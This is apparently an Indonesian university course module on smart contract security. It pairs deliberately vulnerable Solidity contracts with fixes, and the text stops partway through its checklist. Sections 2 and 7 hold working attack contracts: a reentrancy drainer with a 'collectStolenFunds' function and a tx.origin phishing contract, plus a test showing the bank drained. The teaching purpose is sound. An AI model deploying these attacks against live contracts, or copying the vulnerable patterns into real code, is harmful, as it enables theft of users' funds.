# Modul 16. Smart Contract Security

## Deskripsi

Modul ini membahas **keamanan smart contract**, termasuk kerentanan umum yang sering ditemukan, teknik serangan, dan cara pencegahannya. Security adalah aspek krusial karena smart contract mengelola aset digital yang tidak bisa dikembalikan jika terjadi eksploitasi.

## Tujuan Pembelajaran

Setelah menyelesaikan modul ini, mahasiswa mampu:

1. Memahami pentingnya security dalam smart contract development
2. Mengidentifikasi kerentanan umum (Reentrancy, Integer Overflow, Access Control)
3. Menganalisis kode smart contract untuk menemukan vulnerability
4. Menerapkan best practices untuk menulis secure smart contract
5. Menggunakan library OpenZeppelin untuk keamanan
6. Melakukan security audit sederhana

## Prasyarat

- Sudah menyelesaikan Module 08-10 (Solidity, Hardhat, Testing)
- Memahami konsep dasar smart contract dan Solidity
- Memahami cara menulis test dengan Hardhat

## List of Contents

- [Deskripsi](#deskripsi)
- [Tujuan Pembelajaran](#tujuan-pembelajaran)
- [Prasyarat](#prasyarat)
- [1. Pentingnya Smart Contract Security](#1-pentingnya-smart-contract-security)
- [2. Reentrancy Attack](#2-reentrancy-attack)
- [3. Integer Overflow dan Underflow](#3-integer-overflow-dan-underflow)
- [4. Access Control Vulnerabilities](#4-access-control-vulnerabilities)
- [5. Denial of Service (DoS)](#5-denial-of-service-dos)
- [6. Front-Running](#6-front-running)
- [7. Tx.origin vs Msg.sender](#7-txorigin-vs-msgsender)
- [8. OpenZeppelin Security Contracts](#8-openzeppelin-security-contracts)
- [9. Security Best Practices](#9-security-best-practices)
- [10. Hands-on: Audit Smart Contract](#10-hands-on-audit-smart-contract)
- [Ringkasan](#ringkasan)
- [Tugas](#tugas)

---

## 1. Pentingnya Smart Contract Security

### 1.1 Mengapa Security Sangat Penting?

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                    SMART CONTRACT SECURITY LANDSCAPE                         │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│  Karakteristik Smart Contract:                                              │
│  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐        │
│  │  Immutable  │  │   Public    │  │  Financial  │  │  Automated  │        │
│  │  Tidak bisa │  │  Kode bisa  │  │  Mengelola  │  │  Eksekusi   │        │
│  │  diubah     │  │  dibaca     │  │  aset nyata │  │  otomatis   │        │
│  └─────────────┘  └─────────────┘  └─────────────┘  └─────────────┘        │
│         │                │                │                │               │
│         └────────────────┴────────────────┴────────────────┘               │
│                                   │                                         │
│                                   ▼                                         │
│                    ╔═══════════════════════════════╗                        │
│                    ║  BUG = PERMANENT LOSS         ║                        │
│                    ║  Tidak ada rollback           ║                        │
│                    ║  Tidak ada customer support   ║                        │
│                    ╚═══════════════════════════════╝                        │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

### 1.2 Historical Hacks

| Tahun | Incident | Kerugian | Vulnerability |
|-------|----------|----------|---------------|
| 2016 | The DAO Hack | $60 million | Reentrancy |
| 2017 | Parity Wallet | $150 million | Access Control |
| 2018 | BeautyChain | $900 million | Integer Overflow |
| 2021 | Poly Network | $610 million | Access Control |
| 2022 | Wormhole | $320 million | Signature Verification |
| 2022 | Ronin Bridge | $625 million | Private Key Compromise |

### 1.3 Security Mindset

```
┌─────────────────────────────────────────────────────────────────┐
│                    SECURITY MINDSET                              │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  ❌ Developer Mindset:                                          │
│     "Bagaimana cara membuat ini BEKERJA?"                       │
│                                                                 │
│  ✅ Security Mindset:                                           │
│     "Bagaimana cara membuat ini RUSAK?"                         │
│     "Apa yang terjadi jika..."                                  │
│     "Bagaimana attacker bisa exploit ini?"                      │
│                                                                 │
│  Prinsip:                                                       │
│  ┌─────────────────────────────────────────────────────────┐   │
│  │ 1. Assume external calls are malicious                  │   │
│  │ 2. Expect users to provide unexpected input             │   │
│  │ 3. Plan for failure and edge cases                      │   │
│  │ 4. Follow the principle of least privilege              │   │
│  └─────────────────────────────────────────────────────────┘   │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

---

## 2. Reentrancy Attack

### 2.1 Apa itu Reentrancy?

Reentrancy attack terjadi ketika external contract memanggil balik (callback) ke contract yang vulnerable sebelum fungsi pertama selesai dieksekusi.

```
┌─────────────────────────────────────────────────────────────────┐
│                    REENTRANCY ATTACK FLOW                        │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  Vulnerable Contract          Attacker Contract                 │
│  ┌─────────────────┐         ┌─────────────────┐               │
│  │                 │         │                 │               │
│  │  withdraw()     │◄────────│  attack()       │               │
│  │    │            │         │                 │               │
│  │    ▼            │         │                 │               │
│  │  Check balance  │         │                 │               │
│  │    │            │         │                 │               │
│  │    ▼            │         │                 │               │
│  │  Send ETH ──────┼────────►│  receive()      │               │
│  │    │            │         │    │            │               │
│  │    │            │◄────────┼────┘            │               │
│  │    │            │         │  calls withdraw │               │
│  │    │            │         │  AGAIN!         │               │
│  │    ▼            │         │                 │               │
│  │  Update balance │         │                 │               │
│  │  (TOO LATE!)    │         │                 │               │
│  │                 │         │                 │               │
│  └─────────────────┘         └─────────────────┘               │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 2.2 Vulnerable Contract Example

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

// VULNERABLE - DO NOT USE IN PRODUCTION!
contract VulnerableBank {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    // VULNERABLE FUNCTION!
    function withdraw() public {
        uint256 balance = balances[msg.sender];
        require(balance > 0, "No balance");

        // MASALAH: Mengirim ETH SEBELUM update state
        (bool success, ) = msg.sender.call{value: balance}("");
        require(success, "Transfer failed");

        // State diupdate SETELAH external call
        balances[msg.sender] = 0;
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
```

### 2.3 Attacker Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

interface IVulnerableBank {
    function deposit() external payable;
    function withdraw() external;
}

contract Attacker {
    IVulnerableBank public vulnerableBank;
    address public owner;

    constructor(address _vulnerableBankAddress) {
        vulnerableBank = IVulnerableBank(_vulnerableBankAddress);
        owner = msg.sender;
    }

    // Fungsi untuk memulai serangan
    function attack() external payable {
        require(msg.value >= 1 ether, "Need at least 1 ETH");

        // Deposit dulu
        vulnerableBank.deposit{value: msg.value}();

        // Mulai withdraw (akan trigger reentrancy)
        vulnerableBank.withdraw();
    }

    // Fungsi ini dipanggil saat menerima ETH
    receive() external payable {
        // Selama bank masih punya saldo, terus withdraw
        if (address(vulnerableBank).balance >= 1 ether) {
            vulnerableBank.withdraw();
        }
    }

    // Ambil hasil curian
    function collectStolenFunds() external {
        require(msg.sender == owner, "Not owner");
        payable(owner).transfer(address(this).balance);
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
```

### 2.4 Solusi: Checks-Effects-Interactions Pattern

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

contract SecureBank {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint256 balance = balances[msg.sender];

        // 1. CHECKS: Validasi kondisi
        require(balance > 0, "No balance");

        // 2. EFFECTS: Update state SEBELUM external call
        balances[msg.sender] = 0;

        // 3. INTERACTIONS: External call di AKHIR
        (bool success, ) = msg.sender.call{value: balance}("");
        require(success, "Transfer failed");
    }
}
```

### 2.5 Solusi: ReentrancyGuard (OpenZeppelin)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract SecureBankWithGuard is ReentrancyGuard {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    // nonReentrant modifier mencegah reentrancy
    function withdraw() public nonReentrant {
        uint256 balance = balances[msg.sender];
        require(balance > 0, "No balance");

        balances[msg.sender] = 0;

        (bool success, ) = msg.sender.call{value: balance}("");
        require(success, "Transfer failed");
    }
}
```

### 2.6 Test Reentrancy Attack

```javascript
const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("Reentrancy Attack", function () {
    let vulnerableBank, attacker;
    let owner, user1, attackerOwner;

    beforeEach(async function () {
        [owner, user1, attackerOwner] = await ethers.getSigners();

        // Deploy VulnerableBank
        const VulnerableBank = await ethers.getContractFactory("VulnerableBank");
        vulnerableBank = await VulnerableBank.deploy();

        // User1 deposits 10 ETH
        await vulnerableBank.connect(user1).deposit({
            value: ethers.parseEther("10")
        });

        // Deploy Attacker contract
        const Attacker = await ethers.getContractFactory("Attacker");
        attacker = await Attacker.connect(attackerOwner).deploy(
            await vulnerableBank.getAddress()
        );
    });

    it("Should demonstrate reentrancy attack", async function () {
        // Bank has 10 ETH
        const bankBalanceBefore = await vulnerableBank.getBalance();
        console.log("Bank balance before:", ethers.formatEther(bankBalanceBefore));

        // Attacker attacks with 1 ETH
        await attacker.connect(attackerOwner).attack({
            value: ethers.parseEther("1")
        });

        // Attacker now has more than 1 ETH
        const attackerBalance = await attacker.getBalance();
        console.log("Attacker balance after:", ethers.formatEther(attackerBalance));

        // Bank is drained
        const bankBalanceAfter = await vulnerableBank.getBalance();
        console.log("Bank balance after:", ethers.formatEther(bankBalanceAfter));

        // Attacker stole all the funds
        expect(attackerBalance).to.be.gt(ethers.parseEther("1"));
        expect(bankBalanceAfter).to.equal(0);
    });
});
```

---

## 3. Integer Overflow dan Underflow

### 3.1 Apa itu Integer Overflow/Underflow?

```
┌─────────────────────────────────────────────────────────────────┐
│                 INTEGER OVERFLOW/UNDERFLOW                       │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  uint8 range: 0 - 255                                           │
│                                                                 │
│  OVERFLOW (melebihi maximum):                                   │
│  ┌─────────────────────────────────────────────────────────┐   │
│  │  uint8 x = 255                                          │   │
│  │  x + 1 = ?                                              │   │
│  │                                                         │   │
│  │  Expected: 256                                          │   │
│  │  Actual (Solidity < 0.8): 0  ← OVERFLOW!               │   │
│  │  Actual (Solidity >= 0.8): REVERT                       │   │
│  └─────────────────────────────────────────────────────────┘   │
│                                                                 │
│  UNDERFLOW (kurang dari minimum):                               │
│  ┌─────────────────────────────────────────────────────────┐   │
│  │  uint8 x = 0                                            │   │
│  │  x - 1 = ?                                              │   │
│  │                                                         │   │
│  │  Expected: -1                                           │   │
│  │  Actual (Solidity < 0.8): 255  ← UNDERFLOW!            │   │
│  │  Actual (Solidity >= 0.8): REVERT                       │   │
│  └─────────────────────────────────────────────────────────┘   │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 3.2 Vulnerable Contract (Solidity < 0.8)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6; // OLD VERSION - VULNERABLE!

// VULNERABLE - DO NOT USE!
contract VulnerableToken {
    mapping(address => uint256) public balances;

    constructor() {
        balances[msg.sender] = 1000;
    }

    function transfer(address to, uint256 amount) public {
        // VULNERABLE: Jika amount > balances[msg.sender]
        // balances[msg.sender] - amount akan UNDERFLOW
        // Menjadi angka sangat besar!
        require(balances[msg.sender] - amount >= 0, "Insufficient balance");

        balances[msg.sender] -= amount;
        balances[to] += amount;
    }
}
```

### 3.3 Solusi di Solidity >= 0.8

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

contract SafeToken {
    mapping(address => uint256) public balances;

    constructor() {
        balances[msg.sender] = 1000;
    }

    function transfer(address to, uint256 amount) public {
        // Solidity 0.8+ otomatis check overflow/underflow
        // Akan REVERT jika terjadi overflow/underflow
        require(balances[msg.sender] >= amount, "Insufficient balance");

        balances[msg.sender] -= amount;
        balances[to] += amount;
    }
}
```

### 3.4 Menggunakan unchecked (Hati-hati!)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

contract UncheckedExample {
    // Kadang unchecked digunakan untuk gas optimization
    // HANYA gunakan jika YAKIN tidak akan overflow!

    function safeIncrement(uint256 x) public pure returns (uint256) {
        // Dengan safety check (default)
        return x + 1; // Akan revert jika overflow
    }

    function unsafeIncrement(uint256 x) public pure returns (uint256) {
        // TANPA safety check - BERBAHAYA!
        unchecked {
            return x + 1; // Bisa overflow tanpa revert
        }
    }

    // Contoh penggunaan unchecked yang AMAN
    function loopWithUnchecked() public pure returns (uint256) {
        uint256 sum = 0;
        for (uint256 i = 0; i < 100;) {
            sum += i;
            unchecked {
                // Aman karena i pasti < 100, tidak akan overflow
                ++i;
            }
        }
        return sum;
    }
}
```

---

## 4. Access Control Vulnerabilities

### 4.1 Apa itu Access Control?

Access control adalah mekanisme yang membatasi siapa yang bisa mengakses fungsi tertentu.

```
┌─────────────────────────────────────────────────────────────────┐
│                    ACCESS CONTROL LEVELS                         │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  ┌─────────────────────────────────────────────────────────┐   │
│  │  PUBLIC FUNCTIONS                                       │   │
│  │  - Bisa dipanggil siapa saja                            │   │
│  │  - deposit(), getBalance()                              │   │
│  └─────────────────────────────────────────────────────────┘   │
│                          │                                      │
│                          ▼                                      │
│  ┌─────────────────────────────────────────────────────────┐   │
│  │  RESTRICTED FUNCTIONS                                   │   │
│  │  - Hanya user tertentu                                  │   │
│  │  - withdraw() → hanya pemilik balance                   │   │
│  └─────────────────────────────────────────────────────────┘   │
│                          │                                      │
│                          ▼                                      │
│  ┌─────────────────────────────────────────────────────────┐   │
│  │  ADMIN FUNCTIONS                                        │   │
│  │  - Hanya owner/admin                                    │   │
│  │  - pause(), setFee(), withdraw()                        │   │
│  └─────────────────────────────────────────────────────────┘   │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 4.2 Vulnerable Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

// VULNERABLE - DO NOT USE!
contract VulnerableAccessControl {
    address public owner;
    bool public paused;

    constructor() {
        owner = msg.sender;
    }

    // VULNERABLE: Tidak ada access control!
    function setOwner(address newOwner) public {
        owner = newOwner; // Siapa saja bisa jadi owner!
    }

    // VULNERABLE: Tidak ada access control!
    function pause() public {
        paused = true; // Siapa saja bisa pause!
    }

    // VULNERABLE: Tidak ada access control!
    function withdrawAll() public {
        payable(msg.sender).transfer(address(this).balance);
    }
}
```

### 4.3 Secure Contract dengan Modifier

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

contract SecureAccessControl {
    address public owner;
    bool public paused;

    // Custom errors (gas efficient)
    error NotOwner();
    error ContractPaused();
    error ZeroAddress();

    // Events
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Paused(address account);
    event Unpaused(address account);

    constructor() {
        owner = msg.sender;
    }

    // Modifier untuk cek owner
    modifier onlyOwner() {
        if (msg.sender != owner) revert NotOwner();
        _;
    }

    // Modifier untuk cek tidak paused
    modifier whenNotPaused() {
        if (paused) revert ContractPaused();
        _;
    }

    // Modifier untuk cek paused
    modifier whenPaused() {
        if (!paused) revert ContractPaused();
        _;
    }

    // Transfer ownership dengan validasi
    function transferOwnership(address newOwner) public onlyOwner {
        if (newOwner == address(0)) revert ZeroAddress();

        address oldOwner = owner;
        owner = newOwner;

        emit OwnershipTransferred(oldOwner, newOwner);
    }

    // Renounce ownership (hati-hati: tidak bisa dikembalikan!)
    function renounceOwnership() public onlyOwner {
        address oldOwner = owner;
        owner = address(0);

        emit OwnershipTransferred(oldOwner, address(0));
    }

    function pause() public onlyOwner whenNotPaused {
        paused = true;
        emit Paused(msg.sender);
    }

    function unpause() public onlyOwner whenPaused {
        paused = false;
        emit Unpaused(msg.sender);
    }

    function withdrawAll() public onlyOwner {
        payable(owner).transfer(address(this).balance);
    }

    // Function yang bisa dipause
    function deposit() public payable whenNotPaused {
        // deposit logic
    }
}
```

### 4.4 Menggunakan OpenZeppelin Ownable

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/security/Pausable.sol";

contract SecureWithOpenZeppelin is Ownable, Pausable {

    constructor() Ownable(msg.sender) {}

    function pause() public onlyOwner {
        _pause();
    }

    function unpause() public onlyOwner {
        _unpause();
    }

    function deposit() public payable whenNotPaused {
        // deposit logic
    }

    function withdrawAll() public onlyOwner {
        payable(owner()).transfer(address(this).balance);
    }
}
```

### 4.5 Role-Based Access Control (RBAC)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "@openzeppelin/contracts/access/AccessControl.sol";

contract RoleBasedContract is AccessControl {
    bytes32 public constant ADMIN_ROLE = keccak256("ADMIN_ROLE");
    bytes32 public constant MINTER_ROLE = keccak256("MINTER_ROLE");
    bytes32 public constant PAUSER_ROLE = keccak256("PAUSER_ROLE");

    bool public paused;
    mapping(address => uint256) public balances;

    constructor() {
        // Deployer mendapat semua role
        _grantRole(DEFAULT_ADMIN_ROLE, msg.sender);
        _grantRole(ADMIN_ROLE, msg.sender);
        _grantRole(MINTER_ROLE, msg.sender);
        _grantRole(PAUSER_ROLE, msg.sender);
    }

    // Hanya MINTER_ROLE yang bisa mint
    function mint(address to, uint256 amount) public onlyRole(MINTER_ROLE) {
        balances[to] += amount;
    }

    // Hanya PAUSER_ROLE yang bisa pause
    function pause() public onlyRole(PAUSER_ROLE) {
        paused = true;
    }

    // Hanya ADMIN_ROLE yang bisa add/remove roles
    function addMinter(address account) public onlyRole(ADMIN_ROLE) {
        grantRole(MINTER_ROLE, account);
    }

    function removeMinter(address account) public onlyRole(ADMIN_ROLE) {
        revokeRole(MINTER_ROLE, account);
    }
}
```

---

## 5. Denial of Service (DoS)

### 5.1 Apa itu DoS Attack?

DoS attack membuat contract tidak bisa digunakan dengan cara menghabiskan gas atau membuat fungsi selalu revert.

### 5.2 DoS dengan Unbounded Loop

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

// VULNERABLE - DO NOT USE!
contract VulnerableAirdrop {
    address[] public recipients;

    function addRecipient(address recipient) public {
        recipients.push(recipient);
    }

    // VULNERABLE: Loop bisa sangat besar
    // Jika recipients sangat banyak, akan kehabisan gas!
    function distributeAirdrop() public payable {
        uint256 amountPerRecipient = msg.value / recipients.length;

        for (uint256 i = 0; i < recipients.length; i++) {
            payable(recipients[i]).transfer(amountPerRecipient);
        }
    }
}
```

### 5.3 DoS dengan Failed External Call

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

// VULNERABLE - DO NOT USE!
contract VulnerableAuction {
    address public highestBidder;
    uint256 public highestBid;

    function bid() public payable {
        require(msg.value > highestBid, "Bid too low");

        // VULNERABLE: Jika refund gagal, tidak ada yang bisa bid lagi!
        // Attacker bisa membuat contract yang revert di receive()
        if (highestBidder != address(0)) {
            payable(highestBidder).transfer(highestBid);
        }

        highestBidder = msg.sender;
        highestBid = msg.value;
    }
}
```

### 5.4 Solusi: Pull over Push Pattern

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

contract SecureAuction {
    address public highestBidder;
    uint256 public highestBid;

    // Simpan pending withdrawals
    mapping(address => uint256) public pendingReturns;

    function bid() public payable {
        require(msg.value > highestBid, "Bid too low");

        // Simpan refund untuk diambil nanti (PULL)
        if (highestBidder != address(0)) {
            pendingReturns[highestBidder] += highestBid;
        }

        highestBidder = msg.sender;
        highestBid = msg.value;
    }

    // User menarik sendiri refund mereka
    function withdraw() public {
        uint256 amount = pendingReturns[msg.sender];
        require(amount > 0, "Nothing to withdraw");

        // Update state dulu (Checks-Effects-Interactions)
        pendingReturns[msg.sender] = 0;

        // Kirim dengan call (lebih aman dari transfer)
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Withdraw failed");
    }
}
```

### 5.5 Solusi: Batch Processing

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

contract SecureAirdrop {
    mapping(address => uint256) public pendingClaims;

    // Admin set claims dalam batch kecil
    function setClaimsBatch(
        address[] calldata recipients,
        uint256[] calldata amounts
    ) public {
        require(recipients.length == amounts.length, "Length mismatch");
        require(recipients.length <= 100, "Batch too large"); // Limit batch size

        for (uint256 i = 0; i < recipients.length; i++) {
            pendingClaims[recipients[i]] = amounts[i];
        }
    }

    // User claim sendiri (Pull pattern)
    function claim() public {
        uint256 amount = pendingClaims[msg.sender];
        require(amount > 0, "Nothing to claim");

        pendingClaims[msg.sender] = 0;

        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Claim failed");
    }

    receive() external payable {}
}
```

---

## 6. Front-Running

### 6.1 Apa itu Front-Running?

Front-running terjadi ketika attacker melihat transaksi pending di mempool dan mengirim transaksi dengan gas price lebih tinggi agar diproses lebih dulu.

```
┌─────────────────────────────────────────────────────────────────┐
│                    FRONT-RUNNING ATTACK                          │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  1. User mengirim transaksi (visible di mempool)                │
│     ┌─────────────────────────────────────────────┐             │
│     │  User: buy token dengan harga X             │             │
│     │  Gas Price: 20 gwei                         │             │
│     └─────────────────────────────────────────────┘             │
│                          │                                      │
│                          ▼                                      │
│  2. Attacker melihat transaksi di mempool                       │
│     ┌─────────────────────────────────────────────┐             │
│     │  Attacker: "Saya bisa profit dari ini!"     │             │
│     └─────────────────────────────────────────────┘             │
│                          │                                      │
│                          ▼                                      │
│  3. Attacker kirim transaksi dengan gas lebih tinggi            │
│     ┌─────────────────────────────────────────────┐             │
│     │  Attacker: buy token dengan harga X         │             │
│     │  Gas Price: 50 gwei  ← LEBIH TINGGI         │             │
│     └─────────────────────────────────────────────┘             │
│                          │                                      │
│                          ▼                                      │
│  4. Hasil:                                                      │
│     - Transaksi attacker diproses DULUAN                        │
│     - Harga token naik                                          │
│     - User membeli dengan harga lebih mahal                     │
│     - Attacker jual token dengan profit                         │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 6.2 Vulnerable Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

// VULNERABLE - DO NOT USE!
contract VulnerablePuzzle {
    bytes32 public constant ANSWER_HASH = keccak256(abi.encodePacked("secret123"));
    uint256 public prize = 10 ether;

    // VULNERABLE: Answer terlihat di mempool!
    function solve(string memory answer) public {
        require(keccak256(abi.encodePacked(answer)) == ANSWER_HASH, "Wrong answer");

        payable(msg.sender).transfer(prize);
        prize = 0;
    }
}
```

### 6.3 Solusi: Commit-Reveal Pattern

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

contract SecurePuzzle {
    bytes32 public constant ANSWER_HASH = keccak256(abi.encodePacked("secret123"));
    uint256 public prize = 10 ether;

    // Commit phase: simpan hash dari (answer + secret)
    mapping(address => bytes32) public commits;
    mapping(address => uint256) public commitBlock;

    uint256 public constant COMMIT_PERIOD = 10; // blocks

    // Step 1: Commit (tidak ada yang tahu answer)
    function commit(bytes32 hashedAnswer) public {
        commits[msg.sender] = hashedAnswer;
        commitBlock[msg.sender] = block.number;
    }

    // Step 2: Reveal (setelah beberapa block)
    function reveal(string memory answer, bytes32 secret) public {
        require(commits[msg.sender] != bytes32(0), "No commit found");
        require(block.number > commitBlock[msg.sender] + COMMIT_PERIOD, "Too early");

        // Verify commit
        bytes32 expectedCommit = keccak256(abi.encodePacked(answer, secret));
        require(commits[msg.sender] == expectedCommit, "Invalid reveal");

        // Verify answer
        require(keccak256(abi.encodePacked(answer)) == ANSWER_HASH, "Wrong answer");

        // Clear commit
        commits[msg.sender] = bytes32(0);

        // Pay prize
        payable(msg.sender).transfer(prize);
        prize = 0;
    }
}
```

### 6.4 Solusi Lain untuk Front-Running

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

contract SlippageProtection {
    // Untuk DEX: Gunakan slippage protection
    function swap(
        uint256 amountIn,
        uint256 minAmountOut,  // User tentukan minimum yang diterima
        uint256 deadline       // Transaksi expire setelah deadline
    ) public {
        require(block.timestamp <= deadline, "Transaction expired");

        uint256 amountOut = calculateOutput(amountIn);
        require(amountOut >= minAmountOut, "Slippage too high");

        // Execute swap
    }

    function calculateOutput(uint256 amountIn) internal pure returns (uint256) {
        // Simplified calculation
        return amountIn * 99 / 100;
    }
}
```

---

## 7. Tx.origin vs Msg.sender

### 7.1 Perbedaan tx.origin dan msg.sender

```
┌─────────────────────────────────────────────────────────────────┐
│                 TX.ORIGIN vs MSG.SENDER                          │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  Skenario: User → Contract A → Contract B                       │
│                                                                 │
│  ┌─────────┐     call      ┌─────────────┐    call    ┌────────┐│
│  │  User   │──────────────►│ Contract A  │───────────►│Contract││
│  │  (EOA)  │               │             │            │   B    ││
│  └─────────┘               └─────────────┘            └────────┘│
│                                                                 │
│  Di dalam Contract B:                                           │
│  ┌─────────────────────────────────────────────────────────┐   │
│  │  tx.origin  = User (EOA yang memulai transaksi)         │   │
│  │  msg.sender = Contract A (yang memanggil langsung)      │   │
│  └─────────────────────────────────────────────────────────┘   │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 7.2 Vulnerable Contract dengan tx.origin

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

// VULNERABLE - DO NOT USE!
contract VulnerableWallet {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    // VULNERABLE: Menggunakan tx.origin untuk auth
    function transfer(address to, uint256 amount) public {
        require(tx.origin == owner, "Not owner");
        payable(to).transfer(amount);
    }

    receive() external payable {}
}

// Attacker contract
contract PhishingAttack {
    VulnerableWallet public vulnerableWallet;
    address public attacker;

    constructor(address _vulnerableWallet) {
        vulnerableWallet = VulnerableWallet(payable(_vulnerableWallet));
        attacker = msg.sender;
    }

    // Fungsi yang terlihat tidak berbahaya
    function claimReward() public {
        // Ketika owner memanggil ini, tx.origin = owner
        // Jadi transfer akan berhasil!
        vulnerableWallet.transfer(attacker, address(vulnerableWallet).balance);
    }
}
```

### 7.3 Secure Contract dengan msg.sender

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

contract SecureWallet {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    // SECURE: Menggunakan msg.sender
    function transfer(address to, uint256 amount) public {
        require(msg.sender == owner, "Not owner");
        payable(to).transfer(amount);
    }

    receive() external payable {}
}
```

### 7.4 Kapan tx.origin Boleh Digunakan?

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

contract SafeTxOriginUsage {
    // tx.origin BOLEH digunakan untuk mengecek apakah caller adalah EOA
    // (bukan contract)

    modifier onlyEOA() {
        require(tx.origin == msg.sender, "Only EOA allowed");
        _;
    }

    // Fungsi ini hanya bisa dipanggil langsung oleh EOA
    // Tidak bisa dipanggil oleh contract lain
    function sensitiveFunction() public onlyEOA {
        // logic
    }
}
```

---

## 8. OpenZeppelin Security Contracts

### 8.1 Install OpenZeppelin

```bash
npm install @openzeppelin/contracts
```

### 8.2 Security Contracts yang Tersedia

| Contract | Fungsi |
|----------|--------|
| `ReentrancyGuard` | Mencegah reentrancy attack |
| `Pausable` | Pause/unpause contract |
| `Ownable` | Single owner access control |
| `AccessControl` | Role-based access control |
| `PullPayment` | Pull over push pattern |

### 8.3 Contoh Penggunaan Lengkap

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/security/Pausable.sol";
import "@openzeppelin/contracts/security/PullPayment.sol";

contract SecureVault is Ownable, ReentrancyGuard, Pausable, PullPayment {
    mapping(address => uint256) public deposits;

    event Deposited(address indexed user, uint256 amount);
    event WithdrawRequested(address indexed user, uint256 amount);

    constructor() Ownable(msg.sender) {}

    // Deposit dengan proteksi pause
    function deposit() public payable whenNotPaused {
        require(msg.value > 0, "Must deposit something");
        deposits[msg.sender] += msg.value;
        emit Deposited(msg.sender, msg.value);
    }

    // Request withdraw menggunakan Pull pattern
    // nonReentrant mencegah reentrancy
    function requestWithdraw(uint256 amount) public nonReentrant whenNotPaused {
        require(deposits[msg.sender] >= amount, "Insufficient balance");

        // Update state dulu (CEI pattern)
        deposits[msg.sender] -= amount;

        // Gunakan PullPayment dari OpenZeppelin
        _asyncTransfer(msg.sender, amount);

        emit WithdrawRequested(msg.sender, amount);
    }

    // User withdraw menggunakan inherited function dari PullPayment
    // withdrawPayments(address payable payee) sudah ada

    // Admin functions
    function pause() public onlyOwner {
        _pause();
    }

    function unpause() public onlyOwner {
        _unpause();
    }

    // Emergency withdraw oleh owner
    function emergencyWithdraw() public onlyOwner {
        payable(owner()).transfer(address(this).balance);
    }
}
```

---

## 9. Security Best Practices

### 9.1 Checklist Keamanan

```
┌─────────────────────────────────────────────────────────────────┐
│                 SECURITY CHECKLIST                               │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  □ Access Control                                               │
│    ├── Semua fungsi admin memiliki modifier                     │
│    ├── Menggunakan msg.sender, bukan tx.origin                  │
│    └── Role-based jika perlu multiple admin                     │
│                                                                 │
│  □ Reentrancy                                                   │
│    ├── Gunakan Checks-Effects-Interactions pattern              │
│    ├── Gunakan ReentrancyGuard untuk fungsi critical            │
│    └── Hindari state changes setelah external calls             │
│                                                                 │
│  □ Integer Safety                                               │
│    ├── Gunakan Solidity >= 0.8 (built-in overflow check)        │
│    ├── Hati-hati dengan unchecked blocks                        │
│    └── Validasi input parameters                                │
│                                                                 │
│  □ External Calls                                               │
│    ├── Gunakan Pull over Push untuk payments                    │
│    ├── Handle failed calls dengan baik                          │
│    └── Limit gas untuk external calls jika perlu                │
│                                                                 │
│  □ Input Validation                                             │
│    ├── Validasi semua parameter                                 │
│    ├── Check untuk zero address                                 │
│    └── Check untuk zero amounts                                 │
│                                                                 │
│  □ Gas Considerations                                           │
│    ├── Hindari unbounded loops                                  │
